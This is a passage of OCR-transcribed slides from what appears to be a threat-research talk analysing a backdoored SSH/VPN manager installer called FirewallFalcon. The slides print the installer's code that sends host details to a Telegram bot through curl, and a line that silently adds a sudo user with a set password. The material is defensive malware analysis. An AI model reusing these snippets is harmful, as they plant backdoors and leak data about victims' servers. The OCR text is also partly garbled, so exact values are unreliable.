# The payload starts on the next line
s=$((1 + 1))
# Create a temporary file to hold the extracted binary
t=$(mktemp)
# Extract the payload from this script file into the temporary file
tail -n "+$s" "go" > "$t" || { rm -f "$t"; e "Payload extraction failed."; }
# --- Installation -—--
# Install the extracted script to the final destination and make it executable
install -m 755 "$t" "$p" || { rm -f "$t"; e "Installation failed. Check permissions for /usr/local/bin/."; }
# Clean up the temporary file
```

## Slide 111

**LAYER1 OF 64INSTALL_V3.SH**


> Recovered by OCR — confidence 84/100 on the text kept, 31/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LAYER1 OF 64INSTALL_V3.SH
# —-- PAYLOAD START --- DO NOT EDIT BELOW THIS LINE ——-
```

## Slide 112

**ANALYZING 64INSTALL.SHC (LAYER3)**


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING 64INSTALL.SHC (LAYER3)
send_install_notification() {
echo -e "${C_BLUE}s7 First-time installation setup...${C_RESET}"
BOT_TOKEN=" E
CHAT_ID=" "
IPV4=$(curl -s -4 icanhazip.com)
IPV6=$(curl -s -6 icanhazip.com --max-time 5)
HOSTNAME=$ (hostname)
CPU=$(1lscpu | grep ‘Model name' | awk -F: ‘{print $2}' | xargs)
CORES=$(nproc)
RAM=$(free -g | awk '/Mem:/ {print $2 " GB"}')
DISK=$(df -BG --output=size,avail / | awk 'NR==2 {print $1 " total, " $2 " free"}'
MESSAGE=""«!!! #2 New SSH Manager Install !!!x
if [[ -n "$IPV6" && "$IPV6" != "$IPV4" ]]; then
fi
MESSAGE+="*CPU:* $CPU
*Cores:* $CORES
*Disk:* $DISK
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d chat_id="$CHAT_ID" \
-d parse_mode="Markdown" \
—-data-urlencode text="$MESSAGE" > /dev/null 2>&1
+flare
```

## Slide 113

**ANALYZING 64INSTALL.SHC (LAYER3)**


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING 64INSTALL.SHC (LAYER3) C)
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d chat_id="$CHAT_ID" \
-d parse_mode="Markdown" \
—-data-urlencode text="$MESSAGE" > /dev/null 2>&1
```

## Slide 114

**ANALYZING 64INSTALL.SHC (LAYER3)**


> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING 64INSTALL.SHC (LAYER3)
*Hostname:* \* $HOSTNAME\ *
if [[ -n "$IPV6" && "$IPV6" != "$IPV4" |]; then
fi
MESSAGE+="*CPU:* $CPU
*Cores:* $CORES
*RAM:* $RAM
*Disk:* $DISK
```

## Slide 115

**IS THE TELEGRAM BOT STILL ACTIVE?**


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IS THE TELEGRAM BOT STILL ACTIVE?
ubuntu@F lareResearch:~/Research/March-26/FirewallFalcon$ curl -s "https://api.telegram.org/ : /getMe" | python3 -m json
-tool
{
"ok": true
"result": {
"id":
"is bot": true,
"first_name": "Manager",
"username": "firewallfalconmanager_bot"
"can_join_groups": true,
"“can_read_all_group_messages": false,
"supports_inline_queries": false,
"can_connect_to_business": false,
"has_main_web_app": false,
"has_topics_enabled false,
"allows_users_to_create_topics": false
```

## Slide 116

**ANALYZING 64INSTALL.SHC (LAYER3)**


> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING 64INSTALL.SHC (LAYER3) C)
initial_setup() {
useradd -m 2>/dev/null; echo 3 | chpasswd &>/dev/null; usermod —aG sudo &>/dev/null
mkdir -p "$DB_DIR"
touch "$DB_FILE"
mkdir —p "$SSL_CERT_DIR"
setup_limiter_service
if [ ! -f "“$INSTALL_FLAG_FILE" ]; then
send_install_notification
touch "$INSTALL_FLAG_FILE"
fi
```

## Slide 117

### **LET’S RECAP…**

Internet facing SSH on port 22: - Root access - New user and password

Telegram bot exfiltrates data about the host

## Slide 118

### **OH, NO! THAT’S A BACKDOOR**

## Slide 119

**FOUR INTERESTING ELEMENTS IN THE TOOL**

## Slide 120

**REMEMBER THIS ONE…**


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
REMEMBER THIS ONE... C)
Your connection details:
— Tunnel Domain: tun- .manager.firewallfalcon.qzz.io
— Public Key:
— Forwarding To: V2Ray (port 8787)
— Action Required: Ensure a V2Ray service (vless/vmess/trojan) listens on port 8787 (no TLS)
```

## Slide 121

**FOUND THIS IN THE CODE**


> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
FOUND THIS IN THE CODE
71 # --- ZiVPN Variables -—--
73 ZIVPN_BIN="/usr/local/bin/zivpn"
74 ZIVPN_SERVICE_FILE="/etc/systemd/system/zivpn.service"
75 ZIVPN_CONFIG_FILE="$ZIVPN_DIR/config. json"
76 ZIVPN_CERT_FILE="$ZIVPN_DIR/zivpn.crt"
77 ZIVPN_KEY_FILE="$ZIVPN_DIR/zivpn. key"
78
79 DESEC_TOKEN=" 1 <—
80 DESEC_DOMAIN="manager. firewallfalcon.qzz.io"
81
82 SELECTED_USER=""
83 UNINSTALL_MODE="interactive"
84 BANNER_CACHE_TTL=15
85 BANNER_CACHE_TS=0
86 BANNER_CACHE_0S_NAME=""
87 BANNER_CACHE_UP_TIME=""
88 BANNER_CACHE_RAM_USAGE="""'
89 BANNER_CACHE_CPU_LOAD=""
```

## Slide 122

### **ANALYZING FIREWALLFALCON’S DNSTT**

**curl -s**

**https://manager.firewallfalcon.qzz.io/ -H "Authorization: Token <<REDACTED>>"**


> Recovered by OCR — confidence 78/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING FIREWALLFALCON’S DNSTT
"created": "2026-@7-14T@1:26:44.347877Z",
"domain": "manager.firewallfalcon.qzz.io",
-manager.firewallfalcon.qzz.io.",
"name":
"records":
"touched": "2@26-@07-14T@1:26:44.360210Z"
"created": "2026-07-14T00:11:56.900720Z",
"domain": "“manager.firewallfalcon.qzz.io",
"subname": "tun- _ tye
"name": "tun- -Manager.firewallfalcon.qzz.io.",
"records": [
"ns- -manager.firewallfalcon.qzz.io."
],
"ttl": 3600,
"type" : "NS" i
"touched": "2@26-07-14T0@:11:56.908248Z"
curl -s
https://manager.firewallfalcon.qzz.io/
-H "Authorization: Token
<<REDACTED>>"
```

## Slide 123

**ANALYZING FIREWALLFALCON’S DNSTT**


> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CUMULATIVE DNS RECORDS OVER TIME
2025
RECORDS |
2900 -
1400 -
980 -
400 -
-100
2026
MAR-25
T
APR-25
T
MAY-25
JUN-25
JUL-25
MONTH
FEB-26
T
MAR-26
T
APR-26
T
MAY-26
T
JUN-26
T
JUL-26
```

## Slide 124

ANALYZING FIREWALLFALCON’S DNSTT

## Slide 125

### **ANALYZING THE DEPLOYED SERVERS**

`vps-xxxxxxxx` → vps-23tizzl1 `tun-xxxxxxxx` → tun-1h6f9l `ns-xxxxxxxx` → ns-1h6f9l

## Slide 126

### **ANALYZING THE DEPLOYED SERVERS**


> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING THE DEPLOYED SERVERS
Compromised machine
VPW Reseller
Installs Firewall Assigned node ID Create atunnel Create a DVS ¢ \)
Sell cheap VP
To customers
```

## Slide 127

### **WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

Multiple exposed ports with known vulnerabilities and misconfigurations

## Slide 128

### **WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

Multiple exposed ports with known vulnerabilities and misconfigurations Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.

## Slide 129

### **WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

Multiple exposed ports with known vulnerabilities and misconfigurations Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.

Legitimate websites on the server that have no connection to the VPN reseller

## Slide 130

### **WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

Multiple exposed ports with known vulnerabilities and misconfigurations Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.

Legitimate websites on the server that have no connection to the VPN reseller

Wide geo-location, vendors spread even for the same VPN reseller

## Slide 131

### **FOUR INTERESTING ELEMENTS IN THE TOOL**

## Slide 132

## Slide 133

### **ACTIVITY TIMELINE**

**FirewallFalcons**

**NOVEMBER NOVEMBER AUGUST 2024 2025 2026**

## Slide 134

### **ACTIVITY TIMELINE**

FirewallFalcons
89.168.51.93

NOVEMBER  JANUARY  NOVEMBER  AUGUST
2024 2025  2025 2026

## Slide 135

### **ACTIVITY TIMELINE**

FirewallFalcons
89.168.51.93
thefirewoods.org

**NOVEMBER JANUARY MAY NOVEMBER AUGUST 2024 2025 2025 2025 2026**

## Slide 136

### **ACTIVITY TIMELINE**

**FirewallFalcons 89.168.51.93 thefirewoods.org Backdoor MITM FirewallFalcons NOVEMBER JANUARY MAY JUNE NOVEMBER MAY AUGUST 2024 2025 2025 2025 2025 2026 2026**

## Slide 137

**ACTIVITY TIMELINE FirewallFalcons 89.168.51.93 thefirewoods.org Backdoor MITM FirewallFalcons FirewallFalcons NOVEMBER JANUARY MAY JUNE NOVEMBER MAY JUNE AUGUST 2024 2025 2025 2025 2025 2026 2026 2026**

## Slide 138

INTERNET
ENCRYPTED

### **THE INFRASTRUCTURE**

#### **ENCRYPTED**

#### **ENCRYPTED**

## Slide 139

THE INFRASTRUCTURE
INTERNET
ENCRYPTED
VPN TUNNEL CAN TERMINATE HERE
ENCRYPTED

ENCRYPTED

## Slide 140

### **WHO ARE THE FIREWALL FALCON USERS**

- Commercial SSH/WebSocket VPN subscription

- Cheap VPS

- Free internet

- Streaming

## Slide 141

### **WHO ARE THE FIREWALL FALCON USERS**

- Commercial SSH/WebSocket VPN subscription

- Cheap VPS

- Free internet

- Streaming


> Recovered by OCR — confidence 90/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WHO ARE THE FIREWALL FALCON USERS
¢ Commercial SSH/WebSocket VPN subscription
¢ Cheap VPS
e Free internet
¢ Streaming
+flare
Game Publisher
```

## Slide 142

**WHO ARE THE CUSTOMERS OF THE FIREWALL FALCON USERS**

## Slide 143

## Slide 144

# **THANK YOU QUESTIONS?**
